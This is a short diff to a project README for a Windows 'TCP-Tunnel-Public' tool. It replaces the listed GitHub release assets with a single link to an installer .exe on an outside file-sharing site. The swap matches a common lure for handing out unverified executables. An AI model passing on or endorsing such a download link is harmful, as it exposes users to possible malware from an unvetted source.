@@ -176,8 +176,8 @@ git push -u origin main
 
 ## Suggested GitHub release assets
 
-- `TCP-Tunnel-Public-Setup-1.0.0.exe`
-- `TCP-Tunnel-Public.exe` or the full `publish` folder zipped
+- `TCP-Tunnel-Public-Setup-1.0.0.exe` installer download [link](https://transfiles.ru/q4va2)
+
 
 ## Creator
 
